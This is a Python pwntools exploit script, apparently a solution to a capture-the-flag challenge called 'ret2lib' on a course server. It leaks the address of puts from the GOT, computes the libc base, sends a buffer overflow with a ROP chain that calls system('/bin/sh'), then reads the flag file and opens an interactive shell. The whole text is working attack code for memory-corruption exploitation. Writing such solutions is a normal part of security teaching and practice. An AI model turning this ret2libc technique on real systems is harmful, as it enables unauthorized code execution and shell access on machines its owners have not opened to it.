import time
from pwn import *
binary = './ret2lib'
LOCAL = False

r = None
if LOCAL:
    r = process(binary)
else:
    r = remote('csie.ctf.tw', 10127)

libc = ELF('libc.so.6')

padding = 'A' * 56

BIN_SH_STR = 0x18cd17
POP_RDI = 0x0000000000021102

r.readuntil('address(hex):')
PUTS_GOT = '00601018'
r.sendline(PUTS_GOT)
r.readuntil('content:0x')
PUTS_GOT = int(r.read(12), 16)
r.readuntil("What's your name ?\n")

libc_base = PUTS_GOT - libc.symbols['puts']
libc_system = libc_base + libc.symbols['system']
r.sendline(padding+p64(POP_RDI+libc_base)+p64(BIN_SH_STR+libc_base)+p64(libc_system))

time.sleep(0.3)
r.sendline('cat /home/ret2lib/flag')

r.interactive()
